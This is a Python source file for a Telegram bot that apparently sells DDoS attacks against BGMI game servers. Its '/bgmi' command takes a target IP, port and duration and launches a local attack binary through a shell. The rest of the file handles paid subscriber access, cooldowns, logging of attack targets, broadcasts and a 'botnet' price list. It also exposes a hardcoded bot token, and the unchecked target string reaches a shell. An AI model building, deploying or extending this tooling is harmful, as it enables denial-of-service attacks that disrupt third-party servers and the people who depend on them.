#!/usr/bin/python3
# By OPPANDAMODS

import telebot
import subprocess
import datetime
import os
import threading

bot = telebot.TeleBot('8477166523:AAGakUPgpP_L7izdqwwHhjb2hILK07xlm8Q')

admin_id = ["1151701003"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# ---------- Running attacks tracker ----------
running_attacks = {}          # {user_id: process}
running_attacks_lock = threading.Lock()

# Optional: global concurrency limit (0 = unlimited)
MAX_CONCURRENT_ATTACKS = 0


def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []


allowed_user_ids = read_users()


def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Usage: /remove <userid>"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                if file.read().strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for uid in user_ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            response += f"- @{user_info.username} (ID: {uid})\n"
                        except Exception:
                            response += f"- User ID: {uid}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "Only Admin Can Run This Command.")


@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")


def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n"
        f"By OPPANDAMODS"
    )
    bot.reply_to(message, response)


def wait_and_notify(chat_id, target, port, duration, process):
    """Background thread: wait for attack to finish and notify."""
    returncode = None
    try:
        process.wait(timeout=duration + 30)
        returncode = process.returncode
    except subprocess.TimeoutExpired:
        process.kill()
        try:
            process.wait(timeout=5)
        except Exception:
            pass
        bot.send_message(
            chat_id,
            f"⚠️ Attack Force-Stopped (timeout).\n"
            f"Target: {target} | Port: {port} | Time: {duration}s"
        )
        return
    finally:
        with running_attacks_lock:
            running_attacks.pop(chat_id, None)

    if returncode == 0:
        bot.send_message(
            chat_id,
            f"✅ BGMI Attack Finished.\n\n"
            f"Target: {target}\n"
            f"Port: {port}\n"
            f"Time: {duration} Seconds\n"
            f"By OPPANDAMODS"
        )
    else:
        bot.send_message(
            chat_id,
            f"❌ Attack Exited With Code {returncode}.\n"
            f"Target: {target} | Port: {port}"
        )


bgmi_cooldown = {}
COOLDOWN_TIME = 300


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You Are Not Authorized To Use This Command.\nBy OPPANDAMODS")
        return

    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            bot.reply_to(message, "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again.")
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>\nBy OPPANDAMODS")
        return

    try:
        target = command[1]
        port = int(command[2])
        time_sec = int(command[3])
    except ValueError:
        bot.reply_to(message, "Invalid port or time. Both must be numbers.")
        return

    if time_sec > 5000:
        bot.reply_to(message, "Error: Time interval must be less than 5000.")
        return
    if time_sec <= 0 or port <= 0 or port > 65535:
        bot.reply_to(message, "Invalid port or time value.")
        return

    with running_attacks_lock:
        # Per-user duplicate guard
        if user_id in running_attacks:
            bot.reply_to(message, "⚠️ You already have an attack running. Wait for it to finish.")
            return

        # Optional global cap
        if MAX_CONCURRENT_ATTACKS > 0 and len(running_attacks) >= MAX_CONCURRENT_ATTACKS:
            bot.reply_to(message, "⚠️ Server busy: max concurrent attacks reached. Try again later.")
            return

        running_attacks[user_id] = True  # reserve slot

    record_command_logs(user_id, '/bgmi', target, port, time_sec)
    log_command(user_id, target, port, time_sec)
    start_attack_reply(message, target, port, time_sec)

    # 🔧 Lower thread count to keep multiple attacks healthy
    full_command = f"./OPPANDA {target} {port} {time_sec} 100"

    try:
        # ✅ KEY FIX: detach stdio so child never blocks on pipe buffers
        process = subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True,   # detach from bot's process group
        )

        # Quick crash detection — WITHOUT consuming pipes
        try:
            process.wait(timeout=2)
            # Exited within 2 seconds → failed / too quick
            with running_attacks_lock:
                running_attacks.pop(user_id, None)
            if process.returncode != 0:
                bot.reply_to(message, f"Attack failed to start (exit code {process.returncode}).")
            else:
                bot.reply_to(message, "⚠️ Attack exited too quickly. Check OPPANDA binary.")
            return
        except subprocess.TimeoutExpired:
            pass  # still running ✅

        # Register real process and start background notifier
        with running_attacks_lock:
            running_attacks[user_id] = process

        threading.Thread(
            target=wait_and_notify,
            args=(message.chat.id, target, port, time_sec, process),
            daemon=True
        ).start()

    except Exception as e:
        with running_attacks_lock:
            running_attacks.pop(user_id, None)
        bot.reply_to(message, f"Error starting attack: {e}")


@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                response = "Your Command Logs:\n" + "".join(user_logs) if user_logs else "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers.
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By OPPANDAMODS
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = (
        f"Welcome to Your Home, {message.from_user.first_name}! Feel Free to Explore.\n"
        f"Try To Run This Command : /help\n"
        f"Welcome To The World's Best Ddos Bot\n"
        f"By OPPANDAMODS"
    )
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    response = f'''{message.from_user.first_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By OPPANDAMODS'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = f'''{message.from_user.first_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Pr-ice List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs
By OPPANDAMODS
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    response = f'''{message.from_user.first_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
By OPPANDAMODS
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            try:
                with open(USER_FILE, "r") as file:
                    user_ids = file.read().splitlines()
                    for uid in user_ids:
                        try:
                            bot.send_message(uid, message_to_broadcast)
                        except Exception as e:
                            print(f"Failed to send to {uid}: {e}")
                response = "Broadcast Message Sent Successfully To All Users."
            except FileNotFoundError:
                response = "No users found."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


print("Bot started... By OPPANDAMODS")
bot.polling(none_stop=True)
# By OPPANDAMODS
